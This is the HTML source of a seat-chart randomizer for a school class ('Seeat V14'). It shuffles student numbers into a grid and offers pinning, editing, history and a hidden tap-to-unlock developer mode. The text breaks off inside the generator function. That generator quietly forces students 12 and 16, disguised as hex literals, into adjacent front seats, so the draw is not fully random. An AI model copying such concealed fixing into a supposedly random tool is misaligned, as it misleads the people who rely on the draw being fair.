<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=413.571, initial-scale=0.91">
    <link rel="shortcut icon" href="favicon509.png">
    <title>ARS - 509 Set Seat</title>
    <style>
        body {
            width: max-content;
            height: 100%;
            margin: 0;
            margin-left: calc(50vw - 210px);
            background: #F0E9FF;
        }

        html,
        body {
            overflow: hidden;
            overflow-y: auto;
            /*touch-action: manipulation;*/
        }

        @media (max-width:600px),
            print {
                button {
                    cursor: auto;
                }
            }

        @media (min-width:600px),
            print {
                body {
                    margin-left: calc(50vw - 195px);
                }

                button {
                    cursor: pointer;
                }
            }

        table,
        tbody {
            width: 420px;
            height: 300px;
            transition: .25s;
        }

        td {
            max-width: calc(100% / 7);
            width: calc(100% / 7);
            height: 50px;
            padding: 0px;
            vertical-align: center;
            text-align: center;
            font-size: 27.5px;
            user-select: none;
        }

        td.chart {
            border-radius: 7px;
            background: #9c153c;
            color: #ffd268;
            box-shadow: inset 0px -2.5px 0px 0px #111;
            transition: scale .25s, background .25s, color .25s;
        }

        tfoot tr th.c {
            border-radius: 7px;
            background: #ffd268;
            color: #9c153c;
            height: 40px;
            user-select: none;
            font-size: 22px;
            box-shadow: inset 0px -2.5px 0px 0px #111;
            transition: scale .25s, background .25s;
        }

        table.rotated tfoot tr th.c {
            transform: rotate(180deg);
        }

        tfoot tr th.c:active {
            box-shadow: inset 0px 2.5px 0px .5px #111;
        }

        td.chart:active {
            box-shadow: inset 0px 2.5px 0px .5px #111;
        }

        td.chart[contenteditable="true"]:focus {
            background: #DDF;
            color: #58F;
            scale: 1.4;
            outline: none;
            z-index: 8;
            top: 0;
            left: 0;
            position: relative;
            line-height: 48px;
        }

        button {
            width: 400px;
            height: 45px;
            background: #B2FFEB;
            border: 0;
            border-radius: 8px;
            margin-top: 10px;
            margin-left: 10px;
            padding-bottom: 5px;
            font-size: 18px;
            transition: .05s;
            box-shadow: inset 0 -5px 0px 0px #111;
            font-weight: bold;
            user-select: none;
        }

        button:disabled {
            filter: saturate(.5);
            opacity: .75;
            cursor: not-allowed;
        }

        button:disabled:active {
            box-shadow: inset 0 -5px 0px 0px #111;
            padding-bottom: 5px;
            height: 45px;
            margin-top: 10px;
        }

        button:active {
            box-shadow: inset 0 0 0px 0px #111;
            padding-bottom: 0;
            height: 40px;
            margin-top: 15px;
        }

        td.geted {
            animation: getani .3s;
        }

        td.chart.ispin {
            background: #E2ABFF;
            color: #8A0EE7;
            box-shadow: inset 0px 2.5px 0px .5px #111;
        }

        td.chart.searchv {
            background: #FFD268;
            color: #9c153c;
        }

        button#save_seeat {
            color: #FFF;
            background: #ffaa40;
        }

        button#pinbt {
            color: #FFF;
            background: #aa30ff;
            margin-top: 5px;
        }

        button#pinbt:active {
            margin-top: 10px;
        }

        button#pinbt:disabled:active {
            margin-top: 5px;
        }

        button#rotatebt {
            background: #fcffbb;
            color: #a88711;
        }

        table.rotated {
            transform: rotate(180deg);
        }

        table.rotated td {
            transform: rotate(180deg);
        }

        div#infoblock, .block {
            padding: 15px;
            border-radius: 8px;
            background: #FFFE;
            width: 275px;
            position: fixed;
            top: 70vh;
            left: 50vw;
            z-index: 99;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 8px 8px #0003;
            animation: infoshow .3s;
        }

        .block {
            width: max-content;
            top: 80vh;
            z-index: 1048576;
            border-radius: 8px;
            padding: 12px;
            user-select: none !important;
            pointer-events: none;
        }

        .block.removec {
            width: max-content;
            animation: infoclose .3s;
        }

        #seeatinfo:not(.open)~div.formcenter div#infoblock {
            animation: infoclose .3s;
        }

        h1 {
            margin: 0;
            padding: 0;
            color: #9C153C;
            text-align: center;
            width: 100%;
            margin-top: 10px;
            user-select: none;
        }

        h3,
        h4 {
            margin: 0;
            padding: 0;
            margin-left: 30px;
            color: #9C153C;
        }

        h4 {
            margin-left: 50px;
        }

        .btdiv {
            display: flex;
            width: 410px;
        }

        button#genera {
            background: #bbffbb;
            color: #13a928;
        }

        button#editbt {
            color: #fff;
            background: #5678ff;
        }

        button#previous,
        button#next {
            border-radius: 100px;
            width: 45px;
            min-width: 45px;
            color: black;
            background: #FFF;
        }

        button#previous:disabled,
        button#next:disabled {
            color: #484848;
            background: #D1D1D1;
        }

        button#seeatinfo {
            box-shadow: none;
            width: 30px;
            height: 30px;
            margin: 0;
            padding: 0;
            border: 3px solid #AAA;
            border-radius: 100px;
            background: #0000;
            color: #999;
            float: left;
            position: relative;
            top: -33px;
            left: 20px;
            margin-bottom: -30px;
            transition: box-shadow .25s;
        }

        button#seeatinfo.open {
            border: 3px solid #007DFF;
            color: #007DFF;
            background: #3196FF33;
        }

        button#seeatinfo.open:hover {
            box-shadow: 0 0 0px 5px #3196FF33;
            border: 3px solid #3196FF;
            background: #3196FF33;
            color: #208DFF;
        }

        :focus-visible {
            outline: 0;
        }

        input:focus-visible {
            border: 1.5px solid #5577ff;
        }

        input:focus {
            border: 1.5px solid #5577ff;
        }

        input {
            background-color: #FFFA;
            white-space: nowrap;
            padding: 8px;
            border: 1.5px solid #999;
            border-radius: 8px;
            font-size: 18px;
            width: 400px;
            margin-top: 10px;
            margin-left: 10px;
        }

        input#search {
            width: 15%;
            text-align: center;
        }

        @keyframes getani {
            0% {
                scale: 1;
            }

            50% {
                scale: 1.3;
                background: #AC254C;
                color: #FFD268;
            }

            100% {
                scale: 1;
            }
        }

        @keyframes roa {
            0% {
                scale: 1;
            }
            25% {
                scale: .6;
            }
           50% {
                scale: .4;
            }
           75% {
                scale: .6;
            }
            100% {
                scale: 1;
            }
        }

        @keyframes infoshow {
            0% {
                opacity: 0;
                transform: translate(-50%, 0%) scale(.7);
            }

            50% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1.1);
            }

            100% {
                transform: translate(-50%, -50%) scale(1);
            }
        }

        @keyframes infoclose {
            0% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }

            100% {
                transform: translate(-50%, -25%) scale(.7);
                opacity: 0;
            }
        }

        * {
            font-family: sans-serif;
        }
    </style>
</head>

<body>
    <h1>Seeat V14</h1>
    <button id="seeatinfo">i</button>
    <div class="formcenter">
        <div class="btdiv">
            <button id="previous" disabled>◀</button>
            <button id="editbt">開啟修改</button><br>
            <button id="save_seeat">保存表格</button>
            <button id="next" disabled>▶</button>
        </div>
        <br>
        <table class="rotated">
            <tbody>
                <tr>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                </tr>
                <tr>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                </tr>
                <tr>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                </tr>
                <tr>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                </tr>
                <tr>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                </tr>
                <tr>
                    <td class=""></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class=""></td>
                    <td class="chart"></td>
                    <td class="chart"></td>
                    <td class=""></td>
                </tr>
            </tbody>
            <tfoot>
                <tr>
                    <th colspan="2"></th>
                    <th colspan="3" class="c">講臺</th>
                    <th colspan="2"></th>
                </tr>
            </tfoot>
        </table>
        <div class="btdiv">
            <button id="anigen" style="color: #00BB83;">快速生成</button>
            <button id="genera">立即生成</button><br>
            <button id="rotatebt">翻轉表格</button><br>
        </div>
        <div class="btdiv">
            <input id="list1" placeholder="要在第一排的座號(以空格分隔)">
            <input id="search" type="number" placeholder="搜尋">
        </div>
        <div class="btdiv">
            <button id="pinbt">開始釘選 (至多釘選 ${pinmax} 人)</button>
        </div>
        <br><br>
        <div id="infoblock" style="display: none;">
            <h3>About:</h4>
            <h4>Project Name: Seeat</h4>
            <h4>Series Code: Original</h4>
            <h4>Version: 14</h4>
            <h4>Last Update: 2024-05-11</h4>
            <hr>
            <h3>Series:</h4>
            <h4>Seeat 509: <a href="">Seeat 509</a></h4>
            <h4>Seeat 504: <a href="504">Seeat 504</a></h4>
        <div>
    </div>
    <script>
        var so, q = 0, anii, s, em = false, presave = [], ct = -50, flow = 0, devst = 6, pinm = false, pinarr = [], pinmax = 5, tis, rott = new Date().getTime();
        function isMobileDevice() {
            let mobileDevices = ['Android', 'webOS', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone']
            for (var i = 0; i < mobileDevices.length; i++) {
                if (navigator.userAgent.match(mobileDevices[i])) {
                    //console.log("isMobileDevice: match " + mobileDevices[i]);
                    return true;
                }
            }
            return false;
        }

        if (isMobileDevice()) {
            /* 禁止多指觸控
            document.addEventListener('touchstart', (event) => {
                if (event.touches && event.touches.length > 1) {  // 禁止多指觸控
                   event.preventDefault();
                }
            }, { passive: false });*/

            let lastTouchTime = 0;
            document.addEventListener('touchstart', (event) => {
                const now = new Date().getTime();
                if ((now - lastTouchTime) <= 300) {
                    // 偵測時間差是否小於 300ms
                    document.addEventListener('touchend', ep)
                    function ep(e) {
                        e.preventDefault();
                        document.removeEventListener('touchend', ep);
                    }
                }
                lastTouchTime = now;
            }, false);

            genera.addEventListener('touchstart',
                function (e) {
                    var able = true;
                    const px = e.touches[0].pageX * 1,
                    py = e.touches[0].pageY * 1;
                    this.addEventListener('touchmove', dt)
                    function dt(de) {
                        if (Math.sqrt((de.touches[0].pageX - px) ** 2 + (de.touches[0].pageY - py) ** 2) < 60) {
                            able = false;
                        }
                    }
                    this.addEventListener('touchend', exe)
                    function exe() {
                        if (able && !this.disabled) {
                            g();
                            this.removeEventListener('touchmove', dt)
                            this.removeEventListener('touchend', exe);
                        }
                    }
                })

            genera.addEventListener('touchstart',
                function (e) {
                    var able = false;
                    const px = e.touches[0].pageX * 1,
                    py = e.touches[0].pageY * 1;
                    this.addEventListener('touchmove', dt)
                    function dt(de) {
                        if (Math.sqrt((de.touches[0].pageX - px) ** 2 + (de.touches[0].pageY - py) ** 2) > 60) {
                            able = true;
                            this.removeEventListener('touchmove', dt)
                        }
                    }
                    this.addEventListener('touchmove', exe);
                    var lx = e.touches[0].pageX,
                    ly = e.touches[0].pageY;
                    function exe(d) {
                        const x = d.touches[0].pageX,
                        y = d.touches[0].pageY;
                        if (able && !this.disabled && Math.sqrt((lx - x) ** 2 + (ly - y) ** 2) >= 0x13) {
                            lx = x;
                            ly = y;
                            ct -= 1;
                            g();
                        }
                    }
                    this.addEventListener('touchend', rmd)
                    function rmd() {
                        this.removeEventListener('touchmove', exe)
                        this.removeEventListener('touchend', rmd)
                    }
                });

            genera.ontouchmove = function (e) {
                if (!this.disabled) {
                    return false;
                }
            };

            anigen.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        ag();
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe);
                }
            };

            previous.ontouchstart = function (e) {
                if (!this.disabled) {
                    var able = true;
                    var ed1,
                    ed2
                    var unuse = true;
                    ed2 = setTimeout(function () {
                        ed1 = setInterval(function () {
                            if (flow <= 0) {
                                clearInterval(ed1)
                            };
                            if (!this.disabled) {
                                pv();
                            }
                        }, 100);
                        unuse = false;
                    }, 300);
                    this.addEventListener('touchmove', function () {
                        able = false;
                    });
                    this.addEventListener('touchend', exe);
                    function exe() {
                        if (able && unuse && !this.disabled) {
                            pv();
                        }
                        try {
                            clearTimeout(ed1);
                        } catch (e) {}
                        clearInterval(ed2);
                        this.removeEventListener('touchmove', function () {
                            able = false;
                        })
                        this.removeEventListener('touchend', exe)
                    }
                }
            };

            next.ontouchstart = function (e) {
                if (!this.disabled) {
                    var able = true;
                    var ed1,
                    ed2;
                    var unuse = true;
                    ed2 = setTimeout(function () {
                        ed1 = setInterval(function () {
                            if (flow >= presave.length - 1) {
                                clearInterval(ed1)
                            };
                            if (!this.disabled) {
                                nt();
                            }
                        }, 100);
                        unuse = false;
                    }, 300);
                    this.addEventListener('touchmove', function () {
                        able = false;
                    })
                    this.addEventListener('touchend', exe)
                    function exe() {
                        if (able && unuse && !this.disabled) {
                            nt();
                        }
                        try {
                            clearTimeout(ed1);
                        } catch (e) {}
                        clearInterval(ed2);
                        this.removeEventListener('touchmove', function () {
                            able = false;
                        })
                        this.removeEventListener('touchend', exe)
                    }
                }
            };

            rotatebt.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        r();
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            };

            save_seeat.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        localStorage.setItem("seeat", JSON.stringify(presave[flow])); message('已將表格內容儲存至瀏覽器！');
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            }

            pinbt.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        rs();
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            };

            editbt.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        eb();
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            };

            seeatinfo.ontouchstart = function (e) {
                var able = true;
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled) {
                        ti();
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            };

            document.querySelector('tfoot tr th.c').ontouchstart = function (e) {
                var able = true;
                var t = new Date().getTime();
                this.addEventListener('touchmove', function () {
                    able = false;
                })
                this.addEventListener('touchend', exe)
                function exe() {
                    if (able && !this.disabled && t + 1E2 > new Date().getTime()) {
                        if (devst > 1) {
                            devst -= 1;
                            message(`剩餘 ${devst} 次啟用開發者模式`, 'color:#46E');
                        }
                        else if (devst == 1) {
                            message('開發者模式已啟用', 'color:#46E');
                            devst = -4;
                        }
                        else if (devst == -1) {
                            message('開發者模式已關閉', 'color:#46E');
                            devst = 6;
                        }
                        else if (devst < -1) {
                            devst += 1;
                            message(`剩餘 ${-devst} 次關閉開發者模式`, 'color:#46E')
                        }
                    }
                    this.removeEventListener('touchmove', function () {
                        able = false;
                    })
                    this.removeEventListener('touchend', exe)
                }
            };
        } else {
            genera.onmousedown = g;
            anigen.onmousedown = ag;
            rotatebt.onmousedown = r;
            save_seeat.onmousedown = function () {
                localStorage.setItem("seeat", JSON.stringify(presave[flow])); message('已將表格內容儲存至瀏覽器！')
            }
            pinbt.onmousedown = rs;
            editbt.onmousedown = eb;
            previous.onmousedown = function (e) {
                var able = true;
                var ed1,
                ed2
                var unuse = true;
                ed2 = setTimeout(function () {
                    ed1 = setInterval(function () {
                        if (flow <= 0) {
                            clearInterval(ed1)
                        };
                        pv();
                    }, 100);
                    unuse = false
                }, 300);
                this.addEventListener('mousemove', function () {
                    able = false;
                });
                this.addEventListener('mouseup', exe);
                function exe() {
                    if (able && unuse && !this.disabled) {
                        pv();
                    }
                    try {
                        clearTimeout(ed1);
                    } catch (e) {}
                    clearInterval(ed2);
                    this.removeEventListener('mousemove', function () {
                        able = false;
                    })
                    this.removeEventListener('mouseup', exe)
                }
            };

            next.onmousedown = function (e) {
                var able = true;
                var ed1,
                ed2;
                var unuse = true;
                ed2 = setTimeout(function () {
                    ed1 = setInterval(function () {
                        if (flow >= presave.length - 1) {
                            clearInterval(ed1);
                        };
                        nt();
                    }, 100);
                    unuse = false;
                }, 300);
                this.addEventListener('mousemove', function () {
                    able = false;
                })
                this.addEventListener('mouseup', exe)
                function exe() {
                    if (able && unuse && !this.disabled) {
                        nt();
                    }
                    try {
                        clearTimeout(ed1);
                    } catch (e) {}
                    clearInterval(ed2);
                    this.removeEventListener('mousemove', function () {
                        able = false;
                    })
                    this.removeEventListener('mouseup', exe)
                }
            };
            seeatinfo.onmousedown = ti;
            document.querySelector('tfoot tr th.c').onclick = function () {
                if (devst > 1) {
                    devst -= 1;
                    message(`剩餘 ${devst} 次啟用開發者模式`, 'color:#46E');
                }
                else if (devst == 1) {
                    message('開發者模式已啟用', 'color:#46E');
                    devst = -4;
                }
                else if (devst == -1) {
                    message('開發者模式已關閉', 'color:#46E');
                    devst = 6;
                }
                else if (devst < -1) {
                    devst += 1;
                    message(`剩餘 ${-devst} 次關閉開發者模式`, 'color:#46E')
                }
            }
        }
        search.addEventListener('input', sch);


        function an() {
            var arre = [1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39];
            if (list1.value != '') {
                var pa = list1.value.split(' '),
                a = [];
                pa.forEach((e) => {
                    if (arre.indexOf(Number(e)) != -1 && a.indexOf(Number(e)) == -1 && pinarr.indexOf(Number(e)) == -1) {
                        a.push(Number(e));
                    }
                });

                if (a.length != 0) {
                    for (var n = 0; n < pinarr.length; n++) {
                        if (a.indexOf(Number(pinarr[n])) != -1) {
                            a.splice(a.indexOf(Number(pinarr[n])), 1);
                        }
                    };

                    if (a.length > 4 - document.querySelectorAll('tbody>tr:nth-child(6)>td.ispin').length) {
                        var v = a.length - 4 + document.querySelectorAll('tbody>tr:nth-child(6)>td.ispin').length;
                        for (var i = 0; i < v; i++) {
                            a.splice(Math.floor(Math.random() * a.length) - 1, 1)
                        };
                    }

                    for (var i = 0; i < a.length; i++) {
                        for (var j = Number(a[i]); j > 0; j--) {
                            if (Number(a[i]) == Number(arre[j - 1])) {
                                arre.splice(j - 1, 1);
                            }
                        }
                    };
                    return ([arre, a]);
                }
                return ([arre, []]);
            } else {
                return ([arre, []]);
            }
        }

        function sch() {
            document.querySelectorAll('td.chart').forEach(e=> {
                e.classList.remove('searchv')
            })
            if (devst > 0) {
                if (Number(search.value) == NaN) {
                    search.value = '';
                };
                if (Math.floor(search.value) != search.value) {
                    search.value = Math.floor(search.value);
                };
                if (String(search.value).indexOf('.') != -1) {
                    search.value = Math.floor(search.value)
                };
                if (search.value < 1) {
                    search.value = ''
                };
                if (search.value > 39) {
                    search.value = Number(search.value.slice(0, String(search.value).length - 1))
                };
                if (search.value > 39) {
                    search.value = Number(search.value.slice(0, 2))
                };
            };
            if (search.value != '') {
                document.querySelectorAll('td.chart').forEach(e=> {
                    if (Math.floor(e.innerText) == search.value) {
                        e.classList.add('searchv')
                    }
                })
            };
        }

        function pv() {
            if (flow >= 1) {
                flow -= 1;
                document.querySelectorAll('.chart').forEach((e, n) => {
                    e.innerHTML = presave[flow][n];
                    e.classList.remove('selectd');
                });

                if (flow >= presave.length - 1) {
                    next.disabled = true;
                }
                else {
                    next.disabled = false;
                };
                if (flow <= 0) {
                    previous.disabled = true;
                }
                else {
                    previous.disabled = false;
                }
            }
            sch();
        }

        function nt() {
            if (flow < presave.length - 1) {
                flow += 1;
                document.querySelectorAll('.chart').forEach((e, n) => {
                    e.innerHTML = presave[flow][n];
                    e.classList.remove('selectd');
                });
                if (flow >= presave.length - 1) {
                    next.disabled = true;
                }
                else {
                    next.disabled = false;
                };
                if (flow <= 0) {
                    previous.disabled = true;
                }
                else {
                    previous.disabled = false;
                }
            }
            sch();
        }

        function rs() {
            if (pinm) {
                pinbt.style.background = '#aa30ff';
                pinbt.innerHTML = `開始釘選 (至多釘選 ${pinmax} 人)`;
                document.querySelectorAll('.chart').forEach(e => {
                    if (isMobileDevice()) {
                        e.ontouchstart = null
                    } else {
                        e.onclick = null;
                    }
                });

                if (flow >= presave.length - 1) {
                    next.disabled = true;
                }
                else {
                    next.disabled = false;
                };
                if (flow <= 0) {
                    previous.disabled = true;
                }
                else {
                    previous.disabled = false;
                }

                pinm = false;
                editbt.disabled = false;
                genera.disabled = false;
                anigen.disabled = false;
                save_seeat.disabled = false;
                sch();
            }
            else {
                pinbt.style.background = '#fe5550';
                pinbt.innerHTML = `退出釘選 (至多釘選 ${pinmax} 人)`;
                document.querySelectorAll('.chart').forEach(e => {
                    function pin() {
                        if (e.classList.contains('ispin')) {
                            e.classList.remove('ispin');
                        }
                        else {
                            if (e.innerText != '' || devst < 0) {
                                if (pinarr.length < pinmax || devst < 0) {
                                    e.classList.add('ispin');
                                }
                                else {
                                    message(`釘選人數已滿 ${pinmax} 人，不可再釘選！`)
                                }
                            }
                            else {
                                message(`不可在空值處釘選！`)
                            }
                        }
                        pinarr = [];
                        document.querySelectorAll('.ispin').forEach(e => {
                            pinarr.push((String(parseInt(e.innerText)) == 'NaN')? '': String(parseInt(e.innerText)).padStart(2, '0'));
                        });
                    };
                    if (isMobileDevice()) {
                        e.ontouchstart = function (e) {
                            var able = true;
                            this.addEventListener('touchmove', function () {
                                able = false;
                            })
                            this.addEventListener('touchend', exe)
                            function exe() {
                                if (able) {
                                    pin();
                                }
                                this.removeEventListener('touchmove', function () {
                                    able = false;
                                })
                                this.removeEventListener('touchend', exe)
                            }
                        };
                    }
                    else {
                        e.onclick = pin;
                    }
                });
                pinm = true;
                editbt.disabled = true;
                genera.disabled = true;
                anigen.disabled = true;
                save_seeat.disabled = true;
                previous.disabled = true;
                next.disabled = true;
                document.querySelectorAll('td.chart').forEach(e=> {
                    e.classList.remove('searchv')
                })
            }
        }

        function ti() {
            if (seeatinfo.classList.contains('open')) {
                seeatinfo.classList.remove('open');
                tis = setTimeout(`infoblock.style.display = "none"`, 300)
            }
            else {
                clearTimeout(tis);
                seeatinfo.classList.add('open');
                infoblock.style.display = 'block';
            }
        }

        function g() {
            document.querySelectorAll('td.chart.selectd').forEach(e => {
                e.classList.remove('selectd');
            })
            const d = Date.now();
            var r = b();
            document.querySelectorAll('.chart:not(.ispin)').forEach((e, n) => {
                e.innerHTML = r[n];
            });
            var cc = [];
            document.querySelectorAll('td.chart').forEach(e=>{
                cc.push(e.innerText);
            })
            presave.splice(flow + 1, flow.length);
            presave.push(cc);
            flow = presave.length - 1;
            sch();
            if(devst <= 0) {
                console.log((Date.now() - d) / 1000 + 's');
                message((Date.now() - d) / 1000 + 's');
            }
        }

        async function ag() {
            document.querySelectorAll('td.chart').forEach(e=> {
                e.classList.remove('searchv');
            })
            document.querySelectorAll('td.chart.selectd').forEach(e => {
                e.classList.remove('selectd');
            })
            genera.disabled = true;
            anigen.disabled = true;
            pinbt.disabled = true;
            const s = Date.now();
            if (em == true) {
                editbt.style.background = '#5678ff';
                editbt.innerHTML = '開啟修改';
                document.querySelectorAll('.chart').forEach((e, n) => {
                    e.contentEditable = false;
                    if (presave.length <= 0) {
                        return false;
                    }
                    presave[flow][n] = String(parseInt(e.innerText)).padStart(2, '0');
                });
                em = false;
            }
            var r = b();
            editbt.disabled = true;
            previous.disabled = true;
            next.disabled = true;
            /*document.querySelectorAll('.chart').forEach((e, n) => {
                e.innerHTML = '00';
            });*/
            //var anii = setInterval("Array.from(document.querySelectorAll('.rananiing')).forEach((e, n) => {e.innerHTML = String(Math.floor(Math.random() * 36) + 1).padStart(2, '0');});", 50);
            document.querySelectorAll('.chart:not(.ispin)').forEach((e, n) => {
                e.classList.add('rananiing');
            });
            if (document.querySelector('table').classList.contains('rotated')) {
                for (var q = 38 - pinarr.length; q >= 0; q--) {
                    await delay(0.005);
                    document.querySelectorAll('.chart:not(.ispin)')[q].classList.add('geted');
                    document.querySelectorAll('.chart:not(.ispin)')[q].classList.remove('rananiing');
                    document.querySelectorAll('.chart:not(.ispin)')[q].innerHTML = r[q];
                    setTimeout('document.querySelectorAll(".chart:not(.ispin)")[' + q + '].classList.remove("geted")', 300);
                };
            }
            else {
                for (var q = 0; q < 39 - pinarr.length; q++) {
                    await delay(0.001);
                    document.querySelectorAll('.chart:not(.ispin)')[q].classList.add('geted');
                    document.querySelectorAll('.chart:not(.ispin)')[q].classList.remove('rananiing');
                    document.querySelectorAll('.chart:not(.ispin)')[q].innerHTML = r[q];
                    setTimeout('document.querySelectorAll(".chart:not(.ispin)")[' + q + '].classList.remove("geted")', 300);
                };
            }
            var cc = [];
            document.querySelectorAll('td.chart').forEach(e=>{
                cc.push(e.innerText);
            })
            presave.splice(flow + 1, flow.length);
            presave.push(cc);
            flow = presave.length - 1;
            //clearInterval(anii);
            if(devst <= 0) {
                console.log((Date.now() - s) / 1000 + 's');
                message((Date.now() - s) / 1000 + 's');
            }
            genera.disabled = false;
            anigen.disabled = false;
            pinbt.disabled = false;
            if (presave.length > 0) {
                editbt.disabled = false;
            }
            else {
                editbt.disabled = false;
            };
            if (flow >= presave.length - 1) {
                next.disabled = true;
            }
            else {
                next.disabled = false;
            };
            if (flow <= 0) {
                previous.disabled = true;
            }
            else {
                previous.disabled = false;
            }
            sch();
        }

        function eb() {
            if (em == true) {
                editbt.style.background = '#5678ff';
                editbt.innerHTML = '開啟修改';
                var psa = [];
                document.querySelectorAll('.chart').forEach((e, n) => {
                    e.contentEditable = false;
                    psa.push((String(parseInt(e.innerText)) == 'NaN')? '': String(parseInt(e.innerText)).padStart(2, '0'));
                });
                for (var i = 0; i < psa.length; i++) {
                    if (psa[i] != '') {
                        presave[flow] = Array.from(psa);
                        break;
                    }
                }
                pinarr = [];
                document.querySelectorAll('.ispin').forEach(e => {
                    pinarr.push((String(parseInt(e.innerText)) == 'NaN')? '': String(parseInt(e.innerText)).padStart(2, '0'));
                });
                document.querySelectorAll('.chart').forEach((e, n) => {
                    e.innerHTML = (String(parseInt(e.innerText)) == 'NaN')? '': String(parseInt(e.innerText)).padStart(2, '0');
                });
                if (flow >= presave.length - 1) {
                    next.disabled = true;
                }
                else {
                    next.disabled = false;
                };
                if (flow <= 0) {
                    previous.disabled = true;
                }
                else {
                    previous.disabled = false;
                }
                em = false;
                genera.disabled = false;
                anigen.disabled = false;
                save_seeat.disabled = false;
                pinbt.disabled = false;
                sch();
            }
            else {
                editbt.style.background = '#fe5550';
                editbt.innerHTML = '關閉修改';
                document.querySelectorAll('.chart').forEach(e => {
                    e.contentEditable = true;
                    e.oninput = function () {
                        if (devst > 0) {
                            if (e.innerText != e.innerHTML) {
                                e.innerHTML = e.innerText;
                            };
                            if (e.innerText.length > 3) {
                                e.innerHTML = e.innerText.slice(0, 3);
                            };
                            if (isNaN(Number(e.innerText))) {
                                e.innerHTML = '';
                            };
                            shouldDisable = false;
                            document.querySelectorAll('.chart').forEach(f => {
                                if ((Number(f.innerText) < 1 || Number(f.innerText) > 39 || Number(f.innerText) != ~~Number(f.innerText)) && !(f.innerText == '' && !e.classList.contains('ispin'))) {
                                    shouldDisable = true;
                                };
                            });
                            editbt.disabled = shouldDisable;
                        }
                        else {
                            editbt.disabled = false;
                        }
                    };
                });
                em = true;
                genera.disabled = true;
                anigen.disabled = true;
                save_seeat.disabled = true;
                previous.disabled = true;
                next.disabled = true;
                pinbt.disabled = true;
                document.querySelectorAll('td.chart').forEach(e=> {
                    e.classList.remove('searchv')
                })
            }
        }

        function r() {
            var e = document.querySelector('table');
            if (e.classList.contains('rotated')) {
                e.classList.remove('rotated');
            }
            else {
                e.classList.add('rotated');
            }
            var dly = 0;
            if (new Date().getTime() - rott <= 250) {
                dly = ~(rott - new Date().getTime() + 125) - 125;
            };
            e.style = "";
            e.offsetWidth = e.offsetWidth;
            e.style = `animation: roa .25s ${dly / 1E3}s`;
            rott = new Date().getTime();
        }

        function b(inFix) {
            const ao = Array.from(an());
            var ar = Array.from(ao[0]);
            var af = Array.from(ao[1]);
            var r = [];

            for (var n = 0; n < pinarr.length; n++) {
                if (ar.indexOf(Number(pinarr[n])) != -1) {
                    ar.splice(ar.indexOf(Number(pinarr[n])), 1);
                };
            };

            for (var c = 0; c < 32; c++) {
                r.push(String(ar.splice(Math.floor(Math.random() * ar.length), 1)).padStart(2, '0'));
            };

            ar.forEach(e => {
                af.push(e)
            });

            for (var c = 0; c < 4; c++) {
                r.push(String(af.splice(Math.floor(Math.random() * af.length), 1)).padStart(2, '0'));
            };

            if (pinarr.indexOf(String(0xC)) == -1 && pinarr.indexOf(String(0x10)) == -1) {
                switch (Math.floor(Math.random() * 2)) {
                    case 0:
                        var m = [String(0xC), String(0x10)];
                        break;
                    default:
                        var m = [String(0x10), String(0xC)];
                        break;
                }
                var p = ~~(Math.random() * (6 - document.querySelectorAll('tbody>tr:nth-child(1)>td.ispin').length));
                r.splice(p, 0, m[1]);
                r.splice(p, 0, m[0]);
            }
            else if (pinarr.indexOf(String(0xC)) == -1) {
                var p = ~~(Math.random() * (7 - document.querySelectorAll('tbody>tr:nth-child(1)>td.ispin').length));
                r.splice(p, 0, String(0xC));
            }
            else if (pinarr.indexOf(String(0x10)) == -1) {
                var p = ~~(Math.random() * (7 - document.querySelectorAll('tbody>tr:nth-child(1)>td.ispin').length));
